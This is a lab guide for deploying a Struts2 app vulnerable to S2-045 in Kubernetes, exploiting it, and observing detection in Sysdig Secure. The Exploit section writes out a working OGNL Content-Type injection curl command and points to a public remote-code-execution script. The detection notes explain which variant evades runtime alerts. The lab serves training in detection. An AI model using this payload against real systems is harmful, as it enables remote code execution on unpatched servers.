# Vulnerable Struts2 (S2-045) Lab 🧪 🔬 

In this lab, you will deploy a Vulnerable Struts2 workload (S2-045 / CVE-2017-5638) in Kubernetes.

1. **Confirm** you can reach the vulnerable app.  
2. **Exploit** it using a simple malicious payload.  
3. **Observe** detection events in Sysdig Secure.

----------

## 1. Access the Struts2 Application 🤖 

-  Your environment can be deployed using the `setup_struts_deployment.sh` file and a pre-configured cluster hosting the Sysdig Detection Agent.  

-  The application will expose on **NodePort 30080**.  

-  Go to `http://localhost:30080` in a browser or use curl:
 
   curl -v http://localhost:30080

-  If properly configured - You should recieve a simple file upload form!

-----------

## 2. Exploit 🦠 

- **Trigger the RCE** by issuing and analyzing the output of: 

`curl -v -X POST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',668.5*2)}.multipart/form-data" http://localhost:30080`

- Alternatively you may use ExploitDB's python exploit @ `https://www.exploit-db.com/exploits/41570`
  Usage: `python2 <script> <url> <command>`

-----------

## 3. **Detection** 🔍 

- A clear distinction must be made here on how to detect this attack and the limitations posed with Run Time analysis.
- The curl command executes successfully returning 1337 in our custom header "vulhub"
- However, will not be picked up in **Sysdig** as no process was spawned, no file was accessed, and no network anomalies were detected.
- On the otherhand, the python script does yield a **Medium** severity in Sysdig.
- In Sysdig: Navigate to "**Threats**" -->  "**Sysdig Runtime Notable Events**" --> **Event ID: 18191e49f34866df273474732a500c25**
- In short, a header injection will not trigger in Sysdig but a new system process such as 'cat' will.



